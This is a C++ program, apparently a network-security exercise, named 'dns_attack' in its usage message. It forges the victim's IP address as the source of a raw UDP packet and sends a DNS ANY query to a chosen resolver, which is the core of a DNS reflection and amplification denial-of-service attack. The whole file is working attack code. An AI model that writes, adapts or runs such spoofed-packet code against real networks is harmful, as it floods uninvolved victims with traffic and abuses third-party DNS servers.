#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define DATA_SIZE 200
#define TARGET_PORT 7
#define DNS_PORT 53

const char *website[] = {"\6sandia\3gov\0", "\4nctu\2me\0", "\4ieee\3org\0", "\3isc\3org\0", "\3www\6google\3com\0", "\13advertisement\3com\0", "\12p32-contacts\6icloud\3com\0"};
const char *DNS_Q = website[6];
const unsigned DNS_Q_Len = strlen(DNS_Q);

struct dns_t
{
	unsigned short id, flag;
	unsigned short que_count, ans_count, ser_count, add_count;
};
void error_msg(const char *msg) {printf("Error : %s\n", msg); exit(-1);}
int main(int argc, char **argv)
{
	if(argc != 3) error_msg("Usage : sudo ./dns_attack [victim ip] [dns ip]\n");

	char data[DATA_SIZE], *query = data + 40; // Size of IP + UDP + DNS header = 40 bytes
	struct ip *IP = (struct ip *) data;
	struct udphdr *UDP = (struct udphdr *)(data + 20); // IP header has 20 bytes
	struct dns_t *DNS = (struct dns_t *) (data + 28); // UDP header has 8 bytes
	std::memset(data, 0, DATA_SIZE);

	IP->ip_v = 4;
	IP->ip_hl = 5;
	IP->ip_tos = 0;
	IP->ip_len = 44 + DNS_Q_Len + 1;
	IP->ip_id = htons(618);
	IP->ip_off = htons(0x4000);
	IP->ip_ttl = 128;
	IP->ip_p = 17;
	IP->ip_src.s_addr = inet_addr(argv[1]);
	IP->ip_dst.s_addr = inet_addr(argv[2]);

	UDP->source = htons(TARGET_PORT);
	UDP->dest = htons(DNS_PORT);
	UDP->len = htons(24 + DNS_Q_Len + 1);
	UDP->check = 0x123;


	DNS->id = htons(0x0618);
	DNS->flag = htons(0x0100);
	DNS->que_count = htons(1);
	DNS->ans_count = DNS->ser_count = DNS->add_count = 0;

	memcpy(query, DNS_Q, DNS_Q_Len);
	query += DNS_Q_Len + 1;
	*(short *) query = htons(0x00FF);
	query += 2;
	*(short *) query = htons(0x0001);

	struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(DNS_PORT);
	sin.sin_addr.s_addr = inet_addr(argv[2]);

	int socket_fd, val = 1;
	socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //create socket
	if(socket_fd == -1) error_msg("socket failed.");
	if(setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &val, 4) == -1) error_msg("set socket failed.");
	//for(int i = 0 ; i < 5 ; i++) 
	//{
		if(sendto(socket_fd, data, 44 + DNS_Q_Len + 1, 0, (struct sockaddr *)&sin, sizeof(sin)) == -1) error_msg ("send function failed.");
		//sleep(1);
	//}
	close(socket_fd);

	return 0;
}